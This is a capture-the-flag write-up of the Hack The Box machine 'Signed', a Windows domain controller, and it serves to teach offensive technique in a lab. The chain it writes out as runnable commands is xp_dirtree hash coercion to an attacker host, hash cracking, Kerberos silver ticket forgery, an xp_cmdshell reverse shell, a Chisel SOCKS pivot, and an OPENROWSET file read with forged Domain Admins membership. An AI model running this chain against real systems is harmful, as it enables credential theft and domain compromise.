# HTB: Signed — Writeup

**Status:** Rooted — `root.txt` retrieved via SQL-level file read. Full interactive Administrator/SYSTEM shell not yet obtained (see "Outstanding" below).
**OS:** Windows (Domain Controller)
**Scenario:** Assumed breach — HTB supplied local MSSQL credentials for `scott`
**Target IP:** `10.129.242.173`
**Domain:** `signed.htb` (NetBIOS `SIGNED`)
**Hostname:** `DC01`
**Attacker IP:** `10.10.15.26`
**Techniques:** MSSQL enumeration, `xp_dirtree` NTLM hash coercion, NetNTLMv2 cracking, RID brute-forcing, Kerberos silver ticket forgery, `xp_cmdshell` RCE, PowerShell reverse shell, Chisel SOCKS pivot, `OPENROWSET(BULK)` file-read-as-Domain-Admin via silver ticket group injection

---

## Overview

Signed is an "assume breach" Windows Domain Controller box, seeded with credentials for a local MSSQL login (`scott`). `scott` has only `guest`-level access, but is able to abuse `xp_dirtree` to coerce the domain service account `mssqlsvc` into authenticating to an attacker-controlled listener, leaking a crackable NetNTLMv2 hash. Once cracked, `mssqlsvc`'s domain credentials authenticate to MSSQL directly, but only at `guest` level too — the real privilege comes from RID-brute-forcing the domain to find a custom `IT` group (RID 1105), then forging a Kerberos **silver ticket** for the `MSSQLSvc/DC01.signed.htb:1433` SPN using `mssqlsvc`'s own NT hash, claiming membership in that `IT` group. That ticket grants `dbo`/sysadmin rights in SQL Server, which is then used to enable `xp_cmdshell` and get a PowerShell reverse shell as `mssqlsvc`, yielding the user flag.

Root is obtained without ever needing a privileged OS-level shell. A **second** silver ticket is forged for the same `mssqlsvc` identity, this time injecting both the `IT` group (RID 1105, for `dbo` access) and the built-in **Domain Admins** group (RID 512). MSSQL has an undocumented quirk: when the connecting login's identity matches the account MSSQL itself runs as, `OPENROWSET(BULK ...)` file reads honor the *extra group SIDs asserted in that Kerberos ticket* rather than the OS-level permissions of the spawned `xp_cmdshell` process. This lets `mssqlsvc` — who still can't read Administrator's files via `xp_cmdshell` — pull `C:\Users\Administrator\Desktop\root.txt` straight off disk through a plain `SELECT ... FROM OPENROWSET(...)` query.

A Chisel reverse SOCKS tunnel was also set up to reach internal-only services (SMB, WinRM, DNS, Kerberos, LDAP) that aren't exposed externally, with the goal of turning this file-read primitive into a full interactive Administrator/SYSTEM shell (e.g. recovering Administrator's plaintext password from PowerShell history, or an NTLM-relay/coercion route through the now-reachable DNS/SMB services). That follow-on work is still in progress — see "Outstanding" at the end.

---

## Recon

### Initial nmap scan

First attempt failed host discovery — ICMP appears filtered on this target:

```
$ nmap -sCV 10.129.242.173 -oA nmap/signed
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.48 seconds
```

Re-run with `-Pn` to skip host discovery:

```
$ nmap -sCV 10.129.242.173 -oA nmap/signed -Pn
Nmap scan report for 10.129.242.173
Host is up (0.050s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-20T23:55:04
|_Not valid after:  2056-08-20T23:55:04
|_ssl-date: 2026-08-20T23:59:15+00:00; +3s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)

Host script results:
|_clock-skew: 2s
```

Only **1433/tcp (MSSQL)** open from the outside. The `ms-sql-info` / `ms-sql-ntlm-info` NSE scripts both errored out — a known Lua bug in `mssql.lua` against certain SQL Server 2022 negotiation responses, not box-specific. Abandoned in favor of authenticating directly with a proper MSSQL client.

Note: an internal `netstat` after gaining a foothold (see below) later confirmed the box actually listens on the full standard AD port set (Kerberos 88, LDAP 389/636/3268/3269, SMB 445, RPC, DNS 53, WinRM 5986, etc.) — all filtered from the outside by firewall rules, only reachable once pivoted through the box itself.

![placeholder: nmap output screenshot]

---

## MSSQL Enumeration

### Connecting as `scott` (provided local credentials)

```
$ mssqlclient.py scott:'Sm230#C5NatH'@10.129.242.173
[*] Encryption required, switching to TLS
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL (scott  guest@master)> select user_name();
-----
guest
```

`scott` only has `guest`-level access — the connection banner also leaked the server's NetBIOS hostname, `DC01`.

### Coercing `mssqlsvc` via `xp_dirtree`

`scott` can still run `xp_dirtree`, which can be pointed at an attacker-controlled UNC path to trigger outbound SMB authentication:

```
SQL (scott  guest@master)> EXEC master..xp_dirtree '\\10.10.15.26\share\'
subdirectory   depth
------------   -----
```

With Responder listening on `tun0`:

```
$ sudo responder -I tun0
...
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:c5af8b221488203b:C080CABB55ED68393B99827BDF08E42D:0101...
```

Captured a NetNTLMv2 challenge/response for the domain service account `mssqlsvc`.

### Cracking the hash

```
$ hashcat hash /usr/share/wordlists/rockyou.txt
...
MSSQLSVC::SIGNED:...:purPLE9795!@
...
Status...........: Cracked
```

Cracked password: `purPLE9795!@`

### Authenticating as `mssqlsvc`

Initial attempt failed because `mssqlsvc` is a **domain** account, not a native SQL login — `mssqlclient.py` needs `-windows-auth` to treat it as such:

```
$ mssqlclient.py mssqlsvc:'purPLE9795!@'@10.129.242.173
[-] ERROR(DC01): Line 1: Login failed for user 'mssqlsvc'.

$ mssqlclient.py -windows-auth mssqlsvc:'purPLE9795!@'@10.129.242.173
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

Still only `guest`-level — same ceiling as `scott`. Used the `SUSER_SID()` T-SQL function to pull a known account's raw SID for later use:

```
SQL (SIGNED\mssqlsvc  guest@master)> select suser_sid('signed\administrator')
--------------------------------------------------------
0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000
```

Converted with a small local script (binary SID → `S-1-5-21-...` string, per MS-DTYP: revision byte, sub-authority count byte, 6-byte big-endian authority, then N little-endian 4-byte sub-authorities):

```
$ python3 sid_convert.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000
S-1-5-21-4088429403-1159899800-2753317549-500
```

Domain SID: `S-1-5-21-4088429403-1159899800-2753317549` (Administrator's own RID, 500, stripped off the end).

---

## Domain Enumeration — RID Brute Force

Used netexec's `--rid-brute` (SMB protocol module) against the DC using the cracked `mssqlsvc` credentials.

First attempt was capped at the default upper bound and only surfaced **built-in** AD groups (Domain Admins, Enterprise Admins, Schema Admins, Key Admins, etc. — all RID < 1000, created automatically when the domain is stood up):

```
$ nxc mssql -u mssqlsvc -p 'purPLE9795!@' --rid-brute 1000 10.129.242.173
...
512: SIGNED\Domain Admins
513: SIGNED\Domain Users
...
572: SIGNED\Denied RODC Password Replication Group
```

Extending the upper bound to `100000` surfaced custom, domain-specific objects (RID > 1000 — created after initial domain setup):

```
$ nxc mssql -u mssqlsvc -p 'purPLE9795!@' --rid-brute 100000 10.129.242.173
...
1000: SIGNED\DC01$
1101: SIGNED\DnsAdmins
1102: SIGNED\DnsUpdateProxy
1103: SIGNED\mssqlsvc
1104: SIGNED\HR
1105: SIGNED\IT
1106: SIGNED\Finance
1107: SIGNED\Developers
1108: SIGNED\Support
1109: SIGNED\oliver.mills
1110: SIGNED\emma.clark
...
1125: SIGNED\harper.diaz
1126: SIGNED\SQLServer2005SQLBrowserUser$DC01
```

Key finds: `mssqlsvc` itself is RID **1103**; a custom group named **`IT`** is RID **1105** — the most plausible candidate for a group with elevated rights on this database server. The well-known built-in **Domain Admins** group (RID **512**) would be reused later for the root path.

---

## Kerberos Silver Ticket (User Path)

### Computing the NT hash

`mssqlsvc`'s NT hash (needed to sign the forged ticket) was computed from the cracked plaintext using Impacket's own MD4 implementation (sidesteps system OpenSSL builds with MD4 disabled):

```
$ python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("purPLE9795!@").hex())'
ef699384c3285c54128a3ee1ddb1a0cc
```

### Building the ticket

First attempt (impersonating `Administrator`, default RID 500, default group list) was reconsidered — `sysadmin` in SQL Server is granted to specific logins/groups a DBA explicitly configured, not implied by domain-level "Administrator" status. Since the `IT` group was the one that stood out as relevant to this server, the ticket was rebuilt to keep `mssqlsvc`'s own identity (RID 1103, matching the account whose NT hash is signing the ticket) and explicitly inject `IT` group membership via its **full** SID (not bare RID) using `-extra-sid`:

```
$ ticketer.py -spn MSSQLSvc/DC01.signed.htb:1433 \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -nthash ef699384c3285c54128a3ee1ddb1a0cc \
    -user-id 1103 \
    -extra-sid S-1-5-21-4088429403-1159899800-2753317549-1105 \
    -dc-ip 10.129.242.173 \
    -domain signed.htb \
    MSSQLSVC

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/MSSQLSVC
[*] Saving/Updating ticket in MSSQLSVC.ccache
```

### Using the ticket

```
$ export KRB5CCNAME=MSSQLSVC.ccache
$ mssqlclient.py -k dc01.signed.htb
[*] INFO(DC01): Line 1: Changed language setting to us_english.
SQL (SIGNED\mssqlsvc  dbo@master)> select user_name();
---
dbo
```

Now `dbo` (sysadmin-equivalent) — confirming the `IT` group grants elevated SQL privileges as suspected.

---

## Command Execution & Foothold

### Enabling `xp_cmdshell`

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'whoami'
output
---------------
signed\mssqlsvc
NULL
```

### Reverse shell

Listener on the attack box:

```
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
```

Base64-encoded PowerShell reverse shell (TCP socket back to `10.10.15.26:9001`) triggered via `xp_cmdshell`:

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'powershell -exec bypass -enc <base64>';
```

Shell landed as `signed\mssqlsvc`:

```
Connection received on 10.129.242.173 55509
PS C:\Windows\system32> whoami
signed\mssqlsvc
```

### User flag

```
PS C:\Users\mssqlsvc\Desktop> type user.txt
7970c5d116f77507b4b469c04f56b0ae
```

![placeholder: reverse shell landing / user.txt]

---

## Pivoting — Chisel Reverse SOCKS Tunnel

With a PowerShell reverse shell available via `xp_cmdshell`, `chisel.exe` (already staged in `www/`) was pulled onto the box and used to open a reverse SOCKS proxy back to the attacker box, to get at the internal-only AD services (SMB, WinRM, DNS, LDAP, Kerberos) that the external nmap scan couldn't see.

**Server side (attacker box):**

```
$ ./chisel server --reverse -p 8080 -v --socks5
2026/08/21 14:04:25 server: Reverse tunnelling enabled
2026/08/21 14:04:25 server: Listening on http://0.0.0.0:8080
```

**Client side (target, via the reverse shell):**

```
PS C:\users\mssqlsvc\documents> ./chisel.exe client 10.10.15.26:8080 R:socks
```

This establishes a `SOCKS5` proxy on `127.0.0.1:1080` on the attacker box, routable via `proxychains`. Confirming the pivot works, and what's now reachable, from an internal `netstat` inside the reverse shell:

```
PS C:\Windows\system32> netstat -ano -p tcp
...
TCP    0.0.0.0:88              0.0.0.0:0       LISTENING   648    (Kerberos)
TCP    0.0.0.0:389             0.0.0.0:0       LISTENING   648    (LDAP)
TCP    0.0.0.0:445             0.0.0.0:0       LISTENING   4      (SMB)
TCP    0.0.0.0:636             0.0.0.0:0       LISTENING   648    (LDAPS)
TCP    0.0.0.0:1433            0.0.0.0:0       LISTENING   2168   (MSSQL)
TCP    0.0.0.0:3268/3269       0.0.0.0:0       LISTENING   648    (Global Catalog)
TCP    0.0.0.0:5986            0.0.0.0:0       LISTENING   4      (WinRM HTTPS)
TCP    10.129.242.173:1433     10.10.15.26:*   ESTABLISHED 2168   (our MSSQL session)
TCP    10.129.242.173:56439    10.10.15.26:8080 ESTABLISHED 600   (chisel tunnel)
```

Confirms: SMB (445), Kerberos (88), LDAP(S), and WinRM HTTPS (5986) are all listening but were firewalled off from the outside — only RDP, DNS, MSSQL and WinRM HTTPS are exposed per-service on this box's external firewall rules, and only MSSQL was actually open in the original nmap scan.

![placeholder: chisel server/client session]

---

## Root — `OPENROWSET(BULK)` File Read as Domain Admin

### The idea

Rather than trying to escalate the OS-level `xp_cmdshell` process (which always runs under `mssqlsvc`'s own base permissions, unaffected by which Kerberos ticket authenticated the SQL login), MSSQL has a documented-but-obscure quirk: **`OPENROWSET(BULK ...)` file reads use the Windows group SIDs asserted in the client's authenticating Kerberos ticket, *if* that ticket's identity matches the account MSSQL itself is running as.** Since `mssqlsvc` is both the account running the SQL Server service *and* the identity being impersonated via the silver ticket, this applies here — a forged ticket for `mssqlsvc` with **Domain Admins** injected should let `OPENROWSET` read files an ordinary `mssqlsvc` shell can't.

### Rebuilding the ticket with Domain Admins

A second silver ticket was forged, keeping `-user-id 1103` (still `mssqlsvc`) but replacing the group list with **both** `512` (Domain Admins) and `1105` (`IT`, still needed for `dbo` access to run queries at all). Multiple RIDs can be passed as a comma-separated list to `-groups` instead of repeating `-extra-sid`. The trailing positional argument only sets the output `.ccache` filename/PAC display name — it doesn't need to reference a real account:

```
$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -domain signed.htb \
    -spn MSSQLSvc/DC01.signed.htb:1433 \
    -user-id 1103 \
    -groups '512,1105' \
    darkangel

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/darkangel
[*] Saving/Updating ticket in darkangel.ccache

$ export KRB5CCNAME=darkangel.ccache
$ mssqlclient.py -k dc01.signed.htb
SQL (SIGNED\mssqlsvc  dbo@master)> select user_name();
---
dbo
```

`dbo` alone doesn't prove Domain Admins actually made it into the token, though — the `IT` group alone was already sufficient for that. Confirmed directly via the `sys.login_token` system view, which lists exactly the SIDs SQL Server associates with the current login's security token (as opposed to `xp_cmdshell`'s spawned-process `whoami`, which only ever reflects `mssqlsvc`'s fixed base OS token):

```
SQL (SIGNED\mssqlsvc  dbo@master)> select * from sys.login_token;
principal_id  sid                                                          name                    type            usage
------------  -----------------------------------------------------------  ----------------------  --------------  -------------
           3  03                                                           sysadmin                SERVER ROLE     GRANT OR DENY
         259  0105...451040000                                             SIGNED\IT               WINDOWS GROUP   GRANT OR DENY
           0  0105...400020000                                             SIGNED\Domain Admins    WINDOWS GROUP   GRANT OR DENY
           0  0102...20020000                                              BUILTIN\Administrators  WINDOWS GROUP   GRANT OR DENY
...
```

Both `SIGNED\Domain Admins` and (via nested membership resolution) `BUILTIN\Administrators` are present in the token.

### Reading the root flag

```
SQL (SIGNED\mssqlsvc  dbo@master)> select * from OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;

BulkColumn
----------------------------------
b1dd26c580bf15be0ac1502b87b40825
```

**Root flag:** `b1dd26c580bf15be0ac1502b87b40825`

### Troubleshooting note — inconsistent file access

Before landing on `root.txt`, the same technique was tried first against Administrator's PSReadLine command history (`...\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`), hoping to recover a plaintext admin password from prior interactive PowerShell sessions:

```
SQL (SIGNED\mssqlsvc  dbo@master)> select * from OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
ERROR(DC01): Line 1: Cannot bulk load. The file "..." does not exist or you don't have file access rights.
```

This error is deliberately ambiguous (file-missing vs. permission-denied collapse into the same message). Disambiguated by listing the same folder through `xp_cmdshell` instead (which surfaces distinct `cmd.exe` errors):

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'dir "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"'
output
-----------------
Access is denied.
```

"Access is denied" (not "File Not Found") confirms the path is correct and the folder exists — this was purely a permissions gap on that specific nested `AppData` path, not a general failure of the `OPENROWSET` technique (which was independently confirmed to work by successfully reading `mssqlsvc`'s own `user.txt`, and ultimately Administrator's `root.txt` on the Desktop). Worth revisiting — see "Outstanding" below.

![placeholder: OPENROWSET root.txt read]

---

## Credentials Recovered

```
scott:Sm230#C5NatH        (provided, local MSSQL login, guest-level)
mssqlsvc:purPLE9795!@     (cracked NetNTLMv2, domain account)
```

## Key Identifiers

| Item | Value |
|---|---|
| Domain SID | `S-1-5-21-4088429403-1159899800-2753317549` |
| `mssqlsvc` RID | 1103 |
| `IT` group RID | 1105 |
| `Domain Admins` group RID | 512 |
| MSSQL SPN | `MSSQLSvc/DC01.signed.htb:1433` |
| `mssqlsvc` NT hash | `ef699384c3285c54128a3ee1ddb1a0cc` |
| `user.txt` | `7970c5d116f77507b4b469c04f56b0ae` |
| `root.txt` | `b1dd26c580bf15be0ac1502b87b40825` |

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | nmap `-Pn` needed (ICMP filtered); NSE `ms-sql-ntlm-info`/`ms-sql-info` broken against this SQL Server build (known tool bug, not the vuln) |
| Enum | `guest`-level MSSQL access via provided `scott` creds; hostname leaked via TDS connection banner |
| Cred capture | `xp_dirtree` UNC coercion → Responder → NetNTLMv2 → hashcat/rockyou |
| Domain enum | netexec `--rid-brute`, extended past default cap to reveal custom (RID > 1000) groups/users, including the `IT` group |
| User privesc (SQL) | Kerberos **silver ticket** forged with `ticketer.py`, service account's own NT hash, extra SID for the `IT` group → `dbo`/sysadmin on MSSQL |
| Foothold | `sp_configure` to enable `xp_cmdshell` → Base64-encoded PowerShell reverse shell |
| Pivot | Chisel reverse SOCKS proxy through the `xp_cmdshell` shell, exposing internal-only SMB/Kerberos/LDAP/WinRM |
| Root | Second silver ticket, same `mssqlsvc` identity, `-groups '512,1105'` (Domain Admins + IT) → `OPENROWSET(BULK ...)` reads files as Domain Admins despite the OS-level `xp_cmdshell` process staying locked to `mssqlsvc`'s own permissions |
| Verification | `sys.login_token` DMV to directly confirm which Windows groups actually landed in the SQL login's token, vs. inferring from `dbo`/sysadmin status alone |

---

## Lessons / Takeaways

- A silver ticket's target-user positional argument (in `ticketer.py`) only labels the output `.ccache` file / cosmetic PAC display name — the *actual* identity and privileges come from `-user-id` (RID) + `-domain-sid` + whatever extra group SIDs are injected. It doesn't need to correspond to a real account.
- `dbo`/sysadmin status is not proof that a *specific* group SID made it into a forged ticket if another already-included group would independently grant the same access — always verify with something that inspects the actual token contents (`sys.login_token`) rather than inferring from a downstream permission check.
- `xp_cmdshell` and `OPENROWSET(BULK ...)` use two *different* security contexts: the former always runs as the fixed OS account behind the SQL Server service; the latter can honor the connecting login's asserted Windows group SIDs when that login's identity matches the service account itself. Don't assume "no OS-level access" implies "no SQL-level file-read access."
- SQL Server's `OPENROWSET(BULK)` error message deliberately conflates "file not found" and "access denied" into one string — when in doubt, disambiguate through a separate channel (e.g. `xp_cmdshell dir`) that surfaces distinct OS error text.
- Windows security paths (like `AppData\Roaming\...`) are case-insensitive at the filesystem layer; don't chase capitalization differences as a root cause without first confirming a genuine typo elsewhere in the path.

---

## Outstanding

- **Full interactive Administrator/SYSTEM shell** has not yet been obtained — `root.txt` was retrieved purely via the `OPENROWSET` SQL-level file-read primitive, without ever elevating the OS-level shell itself.
- The PSReadLine `ConsoleHost_history.txt` file (a likely source of Administrator's plaintext password, if ever typed interactively) remains inaccessible even with Domain Admins asserted in the ticket — worth revisiting to understand why this one path behaves differently from `Desktop\root.txt`.
- Attempted to enumerate SMB through the Chisel/`proxychains` pivot (`proxychains nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@'`) but hit an unrelated local tooling issue: `proxychains` was trying (and failing) to resolve an IPv6 DNS server address (`fd17:625c:f037:2::3`) from `/etc/resolv.conf`, hanging the request. Switching the target to the tunnel's own loopback (`proxychains nxc smb 127.0.0.1 ...`) got past the SOCKS handshake but hit the same DNS resolution stall further in (NetBIOS/Kerberos hostname lookups inside the SMB auth flow). Needs a proxychains/DNS config fix (e.g. `proxy_dns_old`/`remote_dns_subnet` settings, or forcing IPv4-only DNS) before continuing down the SMB/WinRM/DNS-relay avenue for a full shell.
- Other avenues not yet explored: a DNS-record-based NTLM relay/coercion targeting the DC itself now that DNS (53) is reachable through the tunnel, and inspecting whether the original `mssqlsvc` service logon session (as opposed to the `xp_cmdshell`-spawned process) retains privileges like `SeImpersonatePrivilege` that could be recovered for a local potato-style escalation.
